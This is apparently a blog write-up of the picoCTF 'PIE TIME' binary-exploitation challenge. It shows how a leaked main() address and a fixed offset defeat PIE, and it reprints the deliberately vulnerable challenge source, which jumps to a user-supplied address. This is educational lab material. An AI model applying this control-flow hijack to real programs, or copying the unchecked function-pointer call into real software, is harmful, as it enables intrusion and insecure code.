---
layout: post
title: "picoCTF - PIE TIME"
date: 2025-04-21 12:00:00 +0200
categories: [CTF, picoCTF, Binary-Exploitation, PIE]
tags: [CTF, writeup, picoctf, binary-exploitation, pie, exploit-dev]
description: "Writeup for picoCTF 'PIE TIME' — binary exploitation focused on Position Independent Executables (PIE)."
image:
  path: /assets/img/picoctf/picoctf.png
  alt: "picoCTF PIE TIME screenshot"
toc: true
mermaid: false
math: false
comments: false
---


## Overview

In this picoCTF binary exploitation challenge, I bypassed **PIE (Position Independent Executable)** using a leaked address of `main()` to calculate the runtime address of a hidden `win()` function. The exploit hinged on understanding relative addressing, code layout, and controlling a function pointer call.

---

## Challenge Summary

The binary accepted a user-supplied address and attempted to execute it via a function pointer:

```c
void (*foo)(void) = (void (*)())val;
foo();
```

If the jump landed on an invalid address, the program triggered a segmentation fault handler and exited. However, it also conveniently leaked the address of `main()`:

```c
printf("Address of main: %p\n", &main);
```

The goal was to calculate the runtime address of `win()` based on this leak and hijack the function pointer.

---

## Key Observations

### 1. **PIE Is Enabled**

The binary was compiled with PIE, meaning all functions are loaded at randomized base addresses. However, their **relative offsets remain fixed**. I checked this via `checksec --file=./vuln`

![PIE Enabled](/assets/img/picoctf/PIE%20TIME/img1.png)


### 2. **Leak and Offset Relationship**

Using GDB, I disassembled both `main()` and `win()`:

```bash
disassemble main
=> 0x00000000000011a9 <main>

disassemble win
=> 0x000000000000123f <win>
```

**Offset = 0x123f - 0x11a9 = 0x96**

So, regardless of where the binary is loaded, the address of `win()` is always `main_address + 0x96`.

---

## Exploitation Steps

### Step 1: Leak main()

The program printed:

```
Address of main: 0x55a5b5a5a1a9
```

### Step 2: Compute win()

Calculated:

```
win_address = 0x55a5b5a5a1a9 + 0x96 = 0x55a5b5a5a23f
```

### Step 3: Provide to Program

Input:

```
0x55a5b5a5a23f
```

Result:

```
You won!
picoCTF{example_flag_here}
```

Success — the binary jumped directly to `win()` and printed the flag from `flag.txt`.

---

## Memory Layout Visualization

```
Base Address:      0x55a5b5a5a000
   ├── main():     0x55a5b5a5a1a9 (leaked)
   └── win():      0x55a5b5a5a23f (calculated)
```

---

## Why This Works

Because of the binary’s layout:

- PIE randomizes base addresses, but not function spacing
- A leak of `main()` reveals the base
- With static analysis, the offset to `win()` can be precomputed
- Attacker-supplied address hijacks control flow to valid code

This is a textbook example of chaining **info leaks + relative addressing + execution control** into a working exploit.

---

## Source Code

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void segfault_handler() {
  printf("Segfault Occurred, incorrect address.\n");
  exit(0);
}

int win() {
  FILE *fptr;
  char c;
  printf("You won!\n");
  fptr = fopen("flag.txt", "r");
  if (fptr == NULL) {
    printf("Cannot open file.\n");
    exit(0);
  }
  while ((c = fgetc(fptr)) != EOF) {
    printf("%c", c);
  }
  printf("\n");
  fclose(fptr);
}

int main() {
  signal(SIGSEGV, segfault_handler);
  setvbuf(stdout, NULL, _IONBF, 0);

  printf("Address of main: %p\n", &main);
  unsigned long val;
  printf("Enter the address to jump to, ex => 0x12345: ");
  scanf("%lx", &val);
  printf("Your input: %lx\n", val);
  void (*foo)(void) = (void (*)())val;
  foo();
}
```

---

## Conclusion

This challenge was a great demonstration of how leaking one address in a PIE binary can break ASLR entirely. Once I knew the fixed offset between `main()` and `win()`, I simply added it to the leaked base address and hijacked execution.

**Flag:** `picoCTF{redact}`

